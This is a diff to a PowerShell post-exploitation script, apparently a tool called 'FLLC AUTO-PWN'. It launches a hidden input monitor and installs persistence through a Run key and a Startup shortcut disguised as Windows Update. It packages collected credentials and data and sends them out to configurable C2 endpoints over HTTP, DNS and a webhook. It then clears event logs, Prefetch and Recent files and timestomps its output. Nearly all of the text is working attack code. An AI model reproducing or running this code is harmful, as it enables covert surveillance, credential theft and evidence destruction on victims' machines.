 $monitorScript = Join-Path $payloadBase "input_monitor.py"
 $monitorBat = Join-Path $payloadBase "start_monitor.bat"
@@ -1060,22 +1225,68 @@ if (Test-Path $monitorScript) {
     
     if ($pythonExe) {
         Start-Process -FilePath $pythonExe -ArgumentList "`"$monitorScript`"" -WindowStyle Hidden -PassThru | Out-Null
-        MLog "[PHASE 6] Input monitor started via $pythonExe"
+        MLog "[PHASE 11] Input monitor started via $pythonExe"
     } elseif (Test-Path $monitorBat) {
         Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$monitorBat`"" -WindowStyle Hidden -PassThru | Out-Null
-        MLog "[PHASE 6] Input monitor started via batch"
+        MLog "[PHASE 11] Input monitor started via batch"
     } else {
-        MLog "[PHASE 6] No Python found — input monitor skipped"
+        MLog "[PHASE 11] No Python found — input monitor skipped"
     }
 } else {
-    MLog "[PHASE 6] input_monitor.py not found — skipping"
+    MLog "[PHASE 11] input_monitor.py not found — skipping"
 }
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 7: DATA PACKAGING
+#  PHASE 12: PERSISTENCE INSTALLATION
 # ══════════════════════════════════════════════════════════════════════════
 
-MLog "[PHASE 7] Packaging data..."
+MLog "[PHASE 12] Installing persistence mechanisms..."
+$persistScript = Join-Path $PSScriptRoot "persistence_engine.ps1"
+if (Test-Path $persistScript) {
+    $persistOut = Join-Path $sessionDir "persistence"
+    try {
+        # Auto-configure payload to re-execute auto_pwn on next boot
+        $myPath = $MyInvocation.MyCommand.Path
+        if ($myPath) {
+            & $persistScript -PayloadPath $myPath -OutputDir $persistOut -Method Auto -Silent
+            MLog "[PHASE 12] Persistence engine complete — results in $persistOut"
+        } else {
+            MLog "[PHASE 12] Could not determine script path for persistence"
+        }
+    } catch {
+        MLog "[PHASE 12] Persistence error: $($_.Exception.Message)"
+    }
+} else {
+    # Inline minimal persistence — scheduled task + registry
+    MLog "[PHASE 12] persistence_engine.ps1 not found — running inline..."
+    $myPath = $MyInvocation.MyCommand.Path
+    if ($myPath) {
+        $persistCmd = "powershell.exe -NoP -W Hidden -Exec Bypass -File `"$myPath`""
+        # Registry Run key
+        try {
+            Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
+                -Name "WindowsUpdateHealthSvc" -Value $persistCmd -Force 2>$null
+            MLog "[PHASE 12] Registry persistence installed"
+        } catch {}
+        # Startup folder shortcut
+        try {
+            $startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+            $shell = New-Object -ComObject WScript.Shell
+            $lnk = $shell.CreateShortcut("$startupDir\WindowsUpdate.lnk")
+            $lnk.TargetPath = "powershell.exe"
+            $lnk.Arguments = "-NoP -W Hidden -Exec Bypass -File `"$myPath`""
+            $lnk.WindowStyle = 7
+            $lnk.Save()
+            MLog "[PHASE 12] Startup folder persistence installed"
+        } catch {}
+    }
+}
+
+# ══════════════════════════════════════════════════════════════════════════
+#  PHASE 13: DATA PACKAGING
+# ══════════════════════════════════════════════════════════════════════════
+
+MLog "[PHASE 13] Packaging data..."
 
 # Create manifest
 $manifest = @{
@@ -1086,7 +1297,7 @@ $manifest = @{
     end_time      = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
     duration_sec  = [math]::Round(((Get-Date) - $startTime).TotalSeconds, 1)
     output_dir    = $sessionDir
-    phases_run    = @("recon","credentials","privesc","sqli","npp","input_monitor","packaging")
+    phases_run    = @("evasion","recon","lateral","credentials","dpapi","cloud","comms","crypto","privesc","sqli","npp","input_monitor","persistence","packaging")
     files         = @()
 }
 
@@ -1107,9 +1318,9 @@ $manifest | ConvertTo-Json -Depth 4 | Out-File "$sessionDir\manifest.json" -Enco
 $zipPath = "$collectBase\session_$timestamp.zip"
 try {
     Compress-Archive -Path "$sessionDir\*" -DestinationPath $zipPath -Force -CompressionLevel Optimal
-    MLog "[PHASE 7] Compressed to $zipPath ($([math]::Round((Get-Item $zipPath).Length / 1024, 1)) KB)"
+    MLog "[PHASE 13] Compressed to $zipPath ($([math]::Round((Get-Item $zipPath).Length / 1024, 1)) KB)"
 } catch {
-    MLog "[PHASE 7] Compression failed — raw files remain in $sessionDir"
+    MLog "[PHASE 13] Compression failed — raw files remain in $sessionDir"
 }
 
 MLog "══════════════════════════════════════════════"
@@ -1121,10 +1332,10 @@ MLog "  Output:    $sessionDir"
 MLog "══════════════════════════════════════════════"
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 8: NETWORK EXFILTRATION (optional — if configured)
+#  PHASE 13 (cont.): NETWORK EXFILTRATION
 # ══════════════════════════════════════════════════════════════════════════
 
-MLog "[PHASE 8] Checking network exfil options..."
+MLog "[PHASE 13] Checking network exfil options..."
 
 # Exfil config — edit these for your C2 infrastructure
 $EXFIL_ENABLED   = $false
@@ -1161,9 +1372,9 @@ if ($EXFIL_ENABLED -and $zipPath -and (Test-Path $zipPath)) {
                 Invoke-RestMethod -Uri $EXFIL_HTTP_URL -Method POST -Body $body -ContentType "application/json" -TimeoutSec 30 2>$null
                 Start-Sleep -Milliseconds 500
             }
-            MLog "[PHASE 8] HTTP exfil complete: $chunks chunks sent to $EXFIL_HTTP_URL"
+            MLog "[PHASE 13] HTTP exfil complete: $chunks chunks sent to $EXFIL_HTTP_URL"
         } catch {
-            MLog "[PHASE 8] HTTP exfil failed: $($_.Exception.Message)"
+            MLog "[PHASE 13] HTTP exfil failed: $($_.Exception.Message)"
         }
     }
 
@@ -1190,9 +1401,9 @@ if ($EXFIL_ENABLED -and $zipPath -and (Test-Path $zipPath)) {
                     }
                 }
             }
-            MLog "[PHASE 8] DNS exfil complete via $EXFIL_DNS_DOMAIN"
+            MLog "[PHASE 13] DNS exfil complete via $EXFIL_DNS_DOMAIN"
         } catch {
-            MLog "[PHASE 8] DNS exfil failed: $($_.Exception.Message)"
+            MLog "[PHASE 13] DNS exfil failed: $($_.Exception.Message)"
         }
     }
 
@@ -1203,13 +1414,13 @@ if ($EXFIL_ENABLED -and $zipPath -and (Test-Path $zipPath)) {
                 content = "**FLLC Session Complete**`nHost: ``$env:COMPUTERNAME``  User: ``$env:USERDOMAIN\$env:USERNAME```nFiles: $($manifest.total_files)  Size: $($manifest.total_size_kb)KB`nDuration: $([math]::Round(((Get-Date) - $startTime).TotalSeconds, 0))s`nEDR: $(($envInfo.defenses.edr_detected) -join ', ')`nFindings: Creds=$((Get-ChildItem $decryptDir -Recurse -File 2>$null).Count) PrivEsc=$((Get-ChildItem $sessionDir\privesc -Recurse -File 2>$null).Count)"
             } | ConvertTo-Json
             Invoke-RestMethod -Uri $EXFIL_WEBHOOK -Method POST -Body $summary -ContentType "application/json" -TimeoutSec 10 2>$null
-            MLog "[PHASE 8] Webhook notification sent"
+            MLog "[PHASE 13] Webhook notification sent"
         } catch {
-            MLog "[PHASE 8] Webhook failed: $($_.Exception.Message)"
+            MLog "[PHASE 13] Webhook failed: $($_.Exception.Message)"
         }
     }
 } else {
-    MLog "[PHASE 8] Network exfil disabled or no data to send"
+    MLog "[PHASE 13] Network exfil disabled or no data to send"
 }
 
 MLog "══════════════════════════════════════════════"
@@ -1221,10 +1432,10 @@ MLog "  Output:    $sessionDir"
 MLog "══════════════════════════════════════════════"
 
 # ══════════════════════════════════════════════════════════════════════════
-#  PHASE 9: ANTI-FORENSICS + CLEANUP
+#  PHASE 14: ANTI-FORENSICS + CLEANUP
 # ══════════════════════════════════════════════════════════════════════════
 
-MLog "[PHASE 9] Anti-forensics cleanup..."
+MLog "[PHASE 14] Anti-forensics cleanup..."
 
 # Clear PowerShell history
 Clear-History 2>$null
@@ -1244,14 +1455,14 @@ if ($isAdmin) {
         # Clear PowerShell operational log
         wevtutil cl "Microsoft-Windows-PowerShell/Operational" 2>$null
         wevtutil cl "Windows PowerShell" 2>$null
-        MLog "[PHASE 9] PowerShell event logs cleared"
+        MLog "[PHASE 14] PowerShell event logs cleared"
     } catch {}
 }
 
 # Remove Prefetch evidence (requires admin)
 if ($isAdmin) {
     Remove-Item "C:\Windows\Prefetch\POWERSHELL*" -Force 2>$null
-    MLog "[PHASE 9] Prefetch files cleaned"
+    MLog "[PHASE 14] Prefetch files cleaned"
 }
 
 # Timestomp all output files to 90 days ago
@@ -1269,4 +1480,5 @@ try {
     Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*" -Force 2>$null
 } catch {}
 
-MLog "[PHASE 9] Cleanup complete"
+MLog "[PHASE 14] Cleanup complete"
+MLog "=== FLLC AUTO-PWN v3 (1.777) — ALL 15 PHASES COMPLETE ==="
